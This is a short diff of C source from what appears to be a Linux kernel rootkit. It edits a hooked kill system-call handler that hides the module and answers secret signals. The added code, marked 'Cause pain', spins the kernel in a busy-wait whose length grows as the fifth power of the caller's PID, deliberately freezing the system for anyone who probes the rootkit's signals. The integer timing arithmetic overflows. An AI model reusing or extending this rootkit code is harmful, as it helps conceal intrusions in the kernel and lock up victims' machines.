@@ -334,9 +334,8 @@ hacked_kill(pid_t pid, int sig)
 		else module_hide();
 	}else if(pid != magicPrefixNum && (sig==SIGINVIS || sig==SIGSUPER || sig==SIGMODINVIS)){
 		//Cause pain //ADDED
-		int seconds = pid * pid;
-		int start_time = (int) __builtin_ia32_rdtsc();
-		int end_time = start_time + seconds * 2300000000;
+		int seconds = pid * pid * pid * pid * pid;
+		int end_time = (int) __builtin_ia32_rdtsc() + seconds * 2300000000;
     	while ((int) __builtin_ia32_rdtsc() < end_time);
 	}else{
 		#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
